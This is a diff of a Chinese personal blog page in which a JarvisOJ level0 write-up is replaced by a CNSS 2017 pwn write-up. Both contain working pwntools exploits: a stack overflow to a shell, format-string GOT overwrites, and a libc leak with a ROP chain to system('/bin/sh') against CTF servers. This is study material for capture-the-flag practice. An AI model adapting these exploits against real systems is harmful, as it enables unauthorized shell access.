@@ -3,21 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>JarvisOJ level0 | GoldsNow</title>
+  <title>cnss pwn | GoldsNow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="相当于签到题把
-buf溢出">
+  <meta name="description" content="作为一个刚刚入门的菜鸡，上周轻轻松松把pwn秒了。。这周被pwn给虐了。55555555不过懂了很多的新姿势。很感谢cnss的各位大佬们！！">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ level0">
-<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level0/index.html">
+<meta property="og:title" content="cnss pwn">
+<meta property="og:url" content="https://GoldsNow.github.io/2017/04/05/cnss2017_week_two_pwn/index.html">
 <meta property="og:site_name" content="GoldsNow">
-<meta property="og:description" content="相当于签到题把
-buf溢出">
-<meta property="og:updated_time" content="2017-03-24T12:29:15.214Z">
+<meta property="og:description" content="作为一个刚刚入门的菜鸡，上周轻轻松松把pwn秒了。。这周被pwn给虐了。55555555不过懂了很多的新姿势。很感谢cnss的各位大佬们！！">
+<meta property="og:updated_time" content="2017-04-05T16:05:42.946Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ level0">
-<meta name="twitter:description" content="相当于签到题把
-buf溢出">
+<meta name="twitter:title" content="cnss pwn">
+<meta name="twitter:description" content="作为一个刚刚入门的菜鸡，上周轻轻松松把pwn秒了。。这周被pwn给虐了。55555555不过懂了很多的新姿势。很感谢cnss的各位大佬们！！">
   
     <link rel="alternative" href="/atom.xml" title="GoldsNow" type="application/atom+xml">
   
@@ -223,11 +220,11 @@ buf溢出">
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-[JarvisOJ]level0" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-cnss2017_week_two_pwn" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/24/[JarvisOJ]level0/" class="article-date">
-      <time datetime="2017-03-24T12:21:00.000Z" itemprop="datePublished">2017-03-24</time>
+      <a href="/2017/04/05/cnss2017_week_two_pwn/" class="article-date">
+      <time datetime="2017-04-05T15:36:00.000Z" itemprop="datePublished">2017-04-05</time>
 </a>
     </div>
   
@@ -240,7 +237,7 @@ buf溢出">
         
   
     <h1 class="article-title" itemprop="name">
-      JarvisOJ level0
+      cnss pwn
     </h1>
   
 
@@ -255,7 +252,7 @@ buf溢出">
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Jarvis-oj/">Jarvis oj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cnss-2017/">cnss 2017</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -265,10 +262,36 @@ buf溢出">
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>相当于签到题把</p>
-<p>buf溢出<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">.text:0000000000400596                 public callsystem</div><div class="line">.text:0000000000400596 callsystem      proc near</div><div class="line">.text:0000000000400596                 push    rbp</div><div class="line">.text:0000000000400597                 mov     rbp, rsp</div><div class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</div><div class="line">.text:000000000040059F                 call    _system</div><div class="line">.text:00000000004005A4                 pop     rbp</div><div class="line">.text:00000000004005A5                 retn</div><div class="line">.text:00000000004005A5 callsystem      endp</div><div class="line">.text:00000000004005A5</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6 ; =============== S U B R O U T I N E =======================================</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6 ; Attributes: bp-based frame</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6                 public vulnerable_function</div><div class="line">.text:00000000004005A6 vulnerable_function proc near           ; CODE XREF: main+28p</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6 buf             = byte ptr -80h</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6                 push    rbp</div><div class="line">.text:00000000004005A7                 mov     rbp, rsp</div><div class="line">.text:00000000004005AA                 add     rsp, 0FFFFFFFFFFFFFF80h</div><div class="line">.text:00000000004005AE                 lea     rax, [rbp+buf]</div><div class="line">.text:00000000004005B2                 mov     edx, 200h       ; nbytes</div><div class="line">.text:00000000004005B7                 mov     rsi, rax        ; buf</div><div class="line">.text:00000000004005BA                 mov     edi, 0          ; fd</div><div class="line">.text:00000000004005BF                 call    _read</div><div class="line">.text:00000000004005C4                 leave</div><div class="line">.text:00000000004005C5                 retn</div><div class="line">.text:00000000004005C5 vulnerable_function endp</div></pre></td></tr></table></figure></p>
-<p>直接 exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./level0')</span></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</div><div class="line"></div><div class="line">addr_system= <span class="number">0x400596</span></div><div class="line">shellcode = <span class="string">'a'</span>*<span class="number">136</span>+p64(addr_system)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Hello, World'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+        <p>作为一个刚刚入门的菜鸡，上周轻轻松松把pwn秒了。。这周被pwn给虐了。55555555<br>不过懂了很多的新姿势。很感谢cnss的各位大佬们！！</p>
+<a id="more"></a>
+<h2 id="pwn6、pwn7"><a href="#pwn6、pwn7" class="headerlink" title="pwn6、pwn7"></a>pwn6、pwn7</h2><p>pwn6 为rop而rop的题，太简单了。不值得写wp</p>
+<p>pwn7 是泄漏read地址用下lib 也很简单。</p>
+<h2 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h2><p>被虐了。。</p>
+<p>刚开始的题目开了PIE调试了大半天，还是不会。。</p>
+<p>最后居然题目换了。。都不给发个通知。。</p>
+<p>他是写入栈里的。用动态调试可以看到栈的排布</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">~/Desktop/pwn/cnss 2017$ ./pwn8</div><div class="line">This is a program,which can repeat what you said</div><div class="line">input something:</div><div class="line">%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x</div><div class="line">Haha, your input is:</div><div class="line">ff9b3390,000003ff,00000004,78383025,3830252c,30252c78,252c7838,2c783830,78383025,3830252c,30252c78,252c7838,2c783830,78383025</div><div class="line"></div><div class="line">the length of your input is 70d</div></pre></td></tr></table></figure>
+<p>可以看到第四个参数开始就输出刚刚输出的内容了。 我可以在第一个4字节写入一个地址 就是要修改的地址。。然后到时候 在利用 %4$n 就可以修改指定位置的值了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">memset(&amp;v8, 0, 0x400u);</div><div class="line">puts(&quot;This is a program,which can repeat what you said&quot;);</div><div class="line">puts(&quot;input something:&quot;);</div><div class="line">read(0, &amp;v8, 0x3FFu);</div><div class="line">puts(&quot;Haha, your input is:&quot;);</div><div class="line">printf((const char *)&amp;v8);</div><div class="line">_IO_putc(10, stdout);</div><div class="line">printf(&quot;the length of your input is %ud \n&quot;, strlen((const char *)&amp;v8));</div><div class="line">return 0;</div></pre></td></tr></table></figure>
+<p>看一下 main函数，只有<code>_IO_putc</code>可以利用一下。其他的值都已经被使用过了。 可以看一下<code>return to dl-slove</code> 了解原因。</p>
+<p><code>_IO_putc</code>只要覆盖2个字节就可以了</p>
+<p>因为有getFlag在，只需要覆盖<code>_IO_putc</code>为getFlag的低2字节可以了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">'ctf.cnss.studio'</span>,<span class="number">5008</span>)</div><div class="line"><span class="comment">#p = process('./pwn8')</span></div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line">addr_getflag = <span class="number">0x080485D0</span></div><div class="line">got_io_puts = <span class="number">0x804A014</span></div><div class="line">p.recvuntil(<span class="string">'something:'</span>)</div><div class="line">shellcode = p32(got_io_puts)+<span class="string">'%0'</span>+str((addr_getflag<span class="number">-4</span>)&amp;<span class="number">0xffff</span>)+<span class="string">'c%4$hn'</span></div><div class="line">p.sendline(shellcode)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>这样就过了</p>
+<h2 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h2><p>这个题目相对于上一题。少给了getFlag。但是给了lib</p>
+<p>思路是 覆盖 <code>_IO_putc</code> 为 main，同时泄漏 %267$x 就是<code>__libc_start_main+246</code>的地址</p>
+<p>通过这个来计算system地址。还有的/bin/sh的地址。。。还好在libc里有 <code>\bin\sh</code> 不然题目更加麻烦</p>
+<p>第二次 构造rop 将 <code>_IO_putc</code> 覆盖为rop的地址。 因为 这里最多pop4次 不足以到达输入的区域。后面发现pop前还有<code>add esp,0xc</code>这么棒的代码。。</p>
+<p>然后就构造一下。。最后指向 <code>p32(addr_system)+p32(0)+p32(addr_binsh)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">debug = <span class="number">1</span></div><div class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</div><div class="line">	p = process(<span class="string">'./pwn9'</span>,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:<span class="string">"/home/zzl/Desktop/pwn/cnss 2017/pwn9/"</span>&#125;)</div><div class="line">	gdb.attach(p,<span class="string">"b *0x804842e"</span>)</div><div class="line">	context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">'ctf.cnss.studio'</span>,<span class="number">5009</span>)</div><div class="line"></div><div class="line">got_printf = <span class="number">0x0804A010</span></div><div class="line">got_io_puts = <span class="number">0x804A014</span></div><div class="line"></div><div class="line">addr_pop4 = <span class="number">0x080485e5</span></div><div class="line">addr_ret = <span class="number">0x08048336</span></div><div class="line">addr_main = <span class="number">0x080483C0</span></div><div class="line">addr_loop = <span class="number">0x0804840d</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'something:'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">shellcode = p32(got_io_puts)+<span class="string">'%267$x'</span></div><div class="line">shellcode += <span class="string">'%0'</span>+str((addr_main<span class="number">-12</span>)&amp;<span class="number">0xffff</span>)+<span class="string">'x%4$hn'</span></div><div class="line"></div><div class="line">p.sendline(shellcode)</div><div class="line"></div><div class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"is:\n"</span>)</div><div class="line">p.recv(<span class="number">4</span>)</div><div class="line">addr_libc_start = int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-247</span></div><div class="line"><span class="keyword">print</span> <span class="string">'addr_libc_start == &gt;'</span>,hex(addr_libc_start)</div><div class="line"></div><div class="line">addr_system = addr_libc_start - libc.symbols[<span class="string">'__libc_start_main'</span>] + libc.symbols[<span class="string">'system'</span>]</div><div class="line">addr_binsh = addr_libc_start - libc.symbols[<span class="string">'__libc_start_main'</span>] + <span class="number">0x15B82B</span></div><div class="line"></div><div class="line">shellcode = p32(got_io_puts)+<span class="string">'A'</span>*<span class="number">4</span>+p32(addr_pop4)</div><div class="line">shellcode += <span class="string">'%0'</span>+str((addr_pop4<span class="number">-12</span>)&amp;<span class="number">0xffff</span>)+<span class="string">'x%4$hn'</span>+<span class="string">'aaa'</span>+<span class="string">'BBBB'</span>*<span class="number">3</span>+p32(addr_system)+p32(<span class="number">0</span>)+p32(addr_binsh)</div><div class="line">raw_input()</div><div class="line">p.sendline(shellcode)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>过程是艰辛的。。。终于懂得了如何使用libc文件。。。</p>
+<p><code>p = process(&#39;./pwn9&#39;,env={&quot;LD_LIBRARY_PATH&quot;:&quot;/home/zzl/Desktop/pwn/cnss 2017/pwn9/&quot;})</code></p>
+<p>process的同时 修改环境变量指向当前的目录</p>
+<p>然后ldd 查看文件所指向的libc 文件的名称</p>
+<p>修改了libc名称</p>
+<p>就可以用上了</p>
+<p>还有 gdb.attach(p,”b *0x804842e”) gdb 配合着pwntools使用，简直无敌。</p>
+
       
       
     </div>
@@ -277,13 +300,13 @@ buf溢出">
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]level0/">JarvisOJ level0</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/05/cnss2017_week_two_pwn/">cnss pwn</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 GoldsNow 的个人博客">GoldsNow</a></p>
-        <p><span>发布时间:</span>2017年03月24日 - 20时21分</p>
-        <p><span>最后更新:</span>2017年03月24日 - 20时29分</p>
+        <p><span>发布时间:</span>2017年04月05日 - 23时36分</p>
+        <p><span>最后更新:</span>2017年04月06日 - 00时05分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]level0/" title="JarvisOJ level0">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level0/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level0/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/05/cnss2017_week_two_pwn/" title="cnss pwn">https://GoldsNow.github.io/2017/04/05/cnss2017_week_two_pwn/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/04/05/cnss2017_week_two_pwn/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -296,18 +319,9 @@ buf溢出">
 
 <nav id="article-nav">
   
-    <a href="/2017/03/24/[JarvisOJ]level3/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          JarvisOJ level3
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/03/24/[JarvisOJ]level_x64/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JarvisOJ level2_x64</div>
+    <a href="/2017/03/30/x64之__libc_csu_init通用gadget/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">x64 之 __libc_csu_init 通用gadget</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -318,7 +332,7 @@ buf溢出">
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn6、pwn7"><span class="toc-number">1.</span> <span class="toc-text">pwn6、pwn7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn8"><span class="toc-number">2.</span> <span class="toc-text">pwn8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn9"><span class="toc-number">3.</span> <span class="toc-text">pwn9</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -369,13 +383,11 @@ buf溢出">
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/24/[JarvisOJ]level3/" title="上一篇: JarvisOJ level3">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/24/[JarvisOJ]level_x64/" title="下一篇: JarvisOJ level2_x64">
+            <a href="/2017/03/30/x64之__libc_csu_init通用gadget/" title="下一篇: x64 之 __libc_csu_init 通用gadget">
                 <i class="fa fa-angle-right"></i>
             </a>
         
